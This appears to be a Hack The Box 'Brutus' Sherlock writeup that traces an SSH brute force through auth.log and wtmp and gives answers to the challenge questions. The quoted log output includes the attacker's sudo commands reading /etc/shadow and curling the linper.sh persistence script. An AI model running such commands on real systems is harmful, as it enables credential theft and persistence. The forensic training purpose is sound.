---
layout: writeup
title: "Brutus — HTB Sherlock Writeup"
name: "Brutus"
category: "DFIR"
difficulty: "Very Easy"
platform: "HTB"
os: "Linux"
reading_time: 10
date: "2026-08-26 15:01:10 -04:00"
image: "/assets/images/writeups/brutus.png"
description: "An in-depth investigation of the Brutus sherlock from HackTheBox (HTB)"
summary: |
         In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.


overview_title: "Overview"
overview:
  - |
    Brutus is a HTB sherlock where an attacker bruteforced a server. The main artifacts are auth.log (records authentication events and some other privileged commands ran), wtmp (a binary record of login sessions) and utmp.py. Since the attack included a brute force attempt, we should expect to see multiple failed authentication events in a short time frame. That is because a brute force attempt is basically someone just running a tool that guesses multiple passwords against a certain account or system. Brute forcing does not apply to only passwords.

  - |
    >First Things First: **"Blind Analysis!!"**

  - |
    First, I ran the command `cat auth.log |wc -l` to see how big the file was, it gave out `385` lines. `cat` is a command that expects a file name after it and prints out the contents of the file, `|` is a pipeline that passes the output of the command on the left to the command on the right (spacing doesnt matter), `wc -l` is a command that counts the total lines of a file or output. In order to get an idea of what the file contained without overflooding my screen with 300+ lines, I ran the command `head -n 220 auth.log |tail -n 50`. `head -n 220 auth.log` means take the top x lines (x is the number after the `-n`) from the file and show them, `tail -n 50` means take the last 50 lines and show them. The command I ran essentially did "grab 220 lines and then send it to the pipeline which sent it to the tail command" which resulted in it showing lines 170-220 of the file (around the middle). I also ran `head -n 1 auth.log` and `tail -n 1 auth.log` to see the earliest and latest timestamps and found that all events happened on March 6, between 06:18:01 and 06:41:01.


  - text: |
          After skimming through the output, I saw **multiple Failed password for invalid user server_adm from 65.2.161.68**, and they all happened at the exact same second. This looked like part of a brute force attack so I decided to run a new filter command against that person (the IP). `cat auth.log |grep -i "failed" |grep 65.2.161.68`, this command filters for two things, lines containing the word "failed" (case-insensitive because of the `-i`) and while also containing the IP address of that person. Adding an extra `|wc -l` shows us the total amount of lines (events) found that matched our filter. We saw a 40+ failed password attempts within 10 seconds and also most of them happened in batches, meaning there were like 3+ failed attempts within the same second. This seemed unnatural which led me to believe that IP was the culprit.
  images:
      - "/assets/images/writeups/brutus.png"
      - "/assets/images/writeups/baggage.png"


  - |
    After having found a suspect, I tried to query the file again for every activity this person did that was tracked in the log, I did this by running `cat auth.log |grep -C 3 65.2.161.68`. The `-C 3` stands for context and it also gives the 3 lines before and after the match because by only searching for that IP could leave out some details. The output was 250+ lines long, 214 if the context matches are excluded, and after looking through it for a bit, I found 3 successfull logins and their usernames are root (twice) and cyberjunkie. The first accepted login for root was at 6:31:40 and also disconnected at the same time. Even after finding the root password the user kept guessing more passwords which closely resembles the way tools brute force, they keep trying out a set of passwords given to them beforehand and when a match is found and login succeeds, they still keep going and trying other passwords and user accounts and once it finishes it tells the user the accounts that succeeded. The second root login happened a minute after the first one and lasted for about 5 minutes (likely a human). Then after they logged out they signed in on an account called **cyberjunkie**.

  - |
    After all this, I needed some more information on how they got the credentials for the "cyberjunkie" user and also what they were doing when they signed in as root. Since filtering for every event that explicitly mentioned the attacker's IP address did not give us this information, I decided to filter for everything in the log that happened right after his second root logon until he signed in as "cyberjunkie". The timestamps were around between 06:32:44 and 06:37:24. I couldn't find a way to filter a time range so I decided to filter everything that happened at the "06:3" timestamps. But since that would give a lot of noise, log entries irrelevant to the thing you are searching for,  I added an extra thing to the command.

  - |
    By typing `cat auth.log |grep 06:3|grep -v 65.2.161.68`, I was able to reduce a lot of noise by excluding matches that contained the attacker's IP with the help of `-v` (does the reverse of a normal grep, it excludes the things we search for). This might sound odd at first because "WHY ARE WE EXCLUDING THAT? ISN'T THAT THE MOST IMPORTANT THING?", but we already searched through the 200+ lines that contained the attacker's IP and the info we are looking for is not located there. So by excluding it, 200+ lines are ignored and we also get to see what they did, if anything, after they logged in as "cyberjunkie". We just have to scroll down to the 32nd minute of the hour which was when he logged in as root. The main things I found them do after they logged in as root were: **making a cyberjunkie group, user, adding the user to group sudo, printing out (output) /etc/shadow using cat, and running a .sh script**


side_notes:
  - |
    The timestamps in auth.log do not show the year so if we want to find it we have to utilize the wtmp file too, in there will look for the IP address of the attacker and get the year from there.
  - |
    The descriptions above are a long and in-depth of my blind analysis so some of the things mentioned there might not be accurate. Double check them with the correct answers for each question below.
  - |
    Some of the code outputs have been simplified to make it fit better. Some of the output is omitted.

cards:
  card1:
    card_title: question 01
    question: What is the IP address used by the attacker to carry out the brute force attack?
    answer: "65.2.161.68"
    explanation: |
                 If we look through all the failed password attempts from brute forcing, we will find all of them are from 65.2.161.68
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log | grep -i failed | tail -n 5"
    terminal_output1: |-
      [Mar 6 06:31:41]: Failed password for root from 65.2.161.68
      [Mar 6 06:31:41]: Failed password for root from 65.2.161.68
      [Mar 6 06:31:41]: Failed password for root from 65.2.161.68
      [Mar 6 06:31:42]: Failed password for root from 65.2.161.68
      [Mar 6 06:31:42]: Failed password for root from 65.2.161.68
  card2:
    card_title: "question 02"
    question: "The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"
    answer: "root"
    explanation: |
                 To find this, we can query the log for accepted passwords from the attacker's IP.We can correlate the time the brute force attacks stopped with the time   each account's password was accepted We can see that right after a certain account's password was cracked the attacker stopped brute forcing.
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log|grep -i accepted |grep 65.2.161.68"
    terminal_output1: |-
      [Mar 6 06:31:40]: Accepted password for root from 65.2.161.68
      [Mar 6 06:32:44]: Accepted password for root from 65.2.161.68
      [Mar 6 06:37:34]: Accepted password for cyberjunkie from 65.2.161.68
  card3:
    card_title: "question 03"
    question: "What is the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives?"
    answer: "2024-03-06 06:32:45"
    explanation: |
                 The answer would be the second root login we saw from the previous question. But the question also says use the wtmp file because the one in auth.log is different from the correct one. TO find the one in wtmp, we will have to parse it using the .py file given to us. Then we would have to filter that log for only the attacker's IP then find the timestamp closest to the second root login seen in the previous question because the only difference between the auth.log's and the wtmp file's timestamp is that the auth.log gives us the time he authenticated and the wtmp will give us the time he actually logged in. I used timelineExplorer.exe (eric zimmerman) to view the parsed output, you can use any other alternative for timeline views or you can `cat` the parsed output or if you are on windows use the `type` command. **YOU WILL NEED TO CHANGE THE TIMESTAMPS OF THE WTMP FILE TO UTC.**
    images:
      - "/assets/images/writeups/brutus.png"
      - "/assets/images/writeups/baggage.png"
    terminal_title: "utmp.py"
    terminal_code1: "py utmp.py wtmp -o parsed.csv"
    terminal_code2: "timelineexplorer.exe parsed.csv"
  card4:
    card_title: "question 04"
    question: "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?"
    answer: "37"
    explanation: |
                 If we go back to question 2 and look at the script block area, we will see the timestamp of when the attacker manually logged in as root (the second output). It is not the first because the first output was part of the brute force attack. To find the answer for this, we need to `cat` the auth.log and filter the exact timestamp the user logged in as root and then look at the session ID given.
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log|grep 06:32:44"
    terminal_output1: |-
      [Mar 6 06:32:44]: Accepted password for root from 65.2.161.68
      [Mar 6 06:32:44]: pam_unix(sshd:session): Session opened for user root(uid=0) by (uid=0)
      [Mar 6 06:32:44]: New session 37 of user root
  card5:
    card_title: "question 05"
    question: "The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"
    answer: "cyberjunkie"
    explanation: |
                 If we filter the log for the time period after they logged in as root and got their session ID 37, we will see the things the attacker did and one of those was creating a new user account and adding it to the sudo group. We could also try to filter for a keyword such as "user", "new" or "name". You could choose the easy one "new user" to get the least output or the way I highlighted in the overview section if you prefer to actually understand it better.
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log|grep -i \"new user\""
    terminal_output1: "[Mar 6 06:34:18] useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1"
  card6:
    card_title: "question 06"
    question: "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"
    answer: "T1136.001"
    explanation: |
                 For this question, we can just simply google "mitre new account persistence" or something similar, we could also go to the mitre attack website and look for the one that matches. The type of account to look for is local since the attacker only made a local working home environment for the user account they created.
    terminal_title: "MITRE ATT&CK"
  card7:
    card_title: "question 07"
    question: "What time did the attacker's first SSH session end according to auth.log?"
    answer: "2024-03-06 06:37:24"
    explanation: |
                 At first I thought the answer would be the actual first one, but instead we have to look for the one they manually logged in to. Since we already know that the attacker's first manual login had a session ID of 37, we can filter out the events for only session 37 we will see the time he first logged on and the time that account logged out.
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log|grep -i \"session 37\""
    terminal_output1: |-
      [Mar 6 06:32:44] systemd-logind[411]: New session 37 of user root.
      [Mar 6 06:37:24] systemd-logind[411]: Session 37 logged out.
      [Mar 6 06:37:24] systemd-logind[411]: Removed session 37.
  card8:
    card_title: "question 08"
    question: "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
    answer: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
    explanation: |
                 Since we already know the name of the backdoor account and that it is in the sudo group, it is capable of using sudo. We have also been told that the attacker needed to utilize his higher privileges to download a script and that it was done with the help of sudo. We also know that these kinds of commands get logged in the auth.log file along with the name of the account that used it. This means that we can filter for the name of the backdoor account + sudo and we will see its name and the commands run.
    terminal_title: "auth.log"
    terminal_code1: "cat auth.log|grep -i cyberjunkie|grep -i sudo"
    terminal_output1: |-
      [Mar 6 06:37:57] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
      [Mar 6 06:37:57] ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
      [Mar 6 06:37:57] ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
      [Mar 6 06:39:38] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

notes:
  - |
    **Count before guessing:** A large cluster of failed SSH attempts from one source IP is a useful brute-force indicator. Confirm it against the surrounding authentication events.
  - |
    **Authentication and login time differ:** `auth.log` recorded the successful authentication at `06:32:44`; `wtmp` recorded the interactive terminal session at `06:32:45` UTC.
  - |
    **Correlate artifacts:** Use `auth.log` to understand authentication and session activity, then compare it with `wtmp` rather than relying on a single timestamp.
  - |
    **A brief session can be a clue:** Session 34 opened and closed in the same second; session 37 is the interactive root session.
  - |
    **Continue looking after initial access:** Later entries identify a new account, `cyberjunkie`, added to the `sudo` group. Account creation is a persistence clue worth investigating further.

configure:
  footer_font_size: "15px"
---

{% include writeup-data.html %}
